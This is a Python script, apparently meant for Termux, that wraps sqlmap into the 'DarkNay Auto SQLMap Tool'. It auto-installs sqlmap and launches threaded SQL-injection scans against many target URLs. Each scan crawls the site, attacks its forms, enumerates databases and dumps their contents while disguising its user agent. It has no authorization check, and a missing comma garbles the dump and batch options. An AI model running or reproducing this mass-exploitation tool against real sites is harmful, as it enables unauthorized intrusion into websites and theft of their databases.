import os
import sys
import time
import random
import subprocess
from concurrent.futures import ThreadPoolExecutor

# =========================
# COLORS
# =========================
G = '\033[0;32m'
Y = '\033[1;33m'
C = '\033[0;36m'
R = '\033[0;31m'
W = '\033[0m'

# =========================
# PATH
# =========================
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
SQLMAP_DIR = os.path.join(BASE_DIR, "sqlmap")
SQLMAP_PATH = os.path.join(SQLMAP_DIR, "sqlmap.py")

# =========================
def ensure_sqlmap():
    """Auto detect + auto install SQLMap"""
    if os.path.exists(SQLMAP_PATH):
        return

    print(f"{Y}SQLMap belum ada, auto install...{W}")

    os.system("pkg update -y && pkg install git python -y")

    if os.path.exists(SQLMAP_DIR):
        os.system(f"rm -rf {SQLMAP_DIR}")

    os.system(f"git clone https://github.com/sqlmapproject/sqlmap.git {SQLMAP_DIR}")

    if not os.path.exists(SQLMAP_PATH):
        print(f"{R}Gagal install SQLMap!{W}")
        sys.exit()

    print(f"{G}SQLMap siap digunakan!{W}")

# =========================
def run_scan(url):
    print(f"{C}[SCAN] {url}{W}")

    cmd = [
        "python3",
        SQLMAP_PATH,
        "-u", url,
        "--crawl=2",
        "--forms",
        "--dbs",
        "--dump"
        "--batch",
        "--random-agent",
        "--level=3",
        "--risk=2",
        "--threads=5",
        "--technique=BEUSTQ",
        "--timeout=10",
        "--retries=2",
        "--current-user",
        "--current-db"
    ]

    subprocess.run(cmd)

# =========================
def get_targets():
    target = input("Target (file / url / multiple pakai ,): ").strip()

    # file target
    if os.path.isfile(target):
        with open(target, "r") as f:
            return [x.strip() for x in f.readlines() if x.strip()]

    # multiple URL
    if "," in target:
        return [x.strip() for x in target.split(",") if x.strip()]

    # single URL
    return [target]

# =========================
def start_scan():
    ensure_sqlmap()

    targets = get_targets()

    print(f"{G}Total target: {len(targets)}{W}")

    # MULTI TARGET THREAD
    with ThreadPoolExecutor(max_workers=3) as executor:
        executor.map(run_scan, targets)

# =========================
def banner():
    os.system("clear")
    print(f"""{C}
██████╗  █████╗ ██████╗ ██╗  ██╗███╗   ██╗ █████╗
██╔══██╗██╔══██╗██╔══██╗██║ ██╔╝████╗  ██║██╔══██╗
██║  ██║███████║██████╔╝█████╔╝ ██╔██╗ ██║███████║
██║  ██║██╔══██║██╔══██╗██╔═██╗ ██║╚██╗██║██╔══██║
██████╔╝██║  ██║██║  ██║██║  ██╗██║ ╚████║██║  ██║
╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝

        {R}DarkNay Auto SQLMap Tool{W}
""")

# =========================
def menu():
    print(f"{C}1. Start Scan (Auto Detect + Multi Target){W}")
    print(f"{C}2. Exit{W}")

# =========================
if __name__ == "__main__":
    banner()
    menu()

    choice = input("Pilih: ")

    if choice == "1":
        start_scan()
    else:
        sys.exit()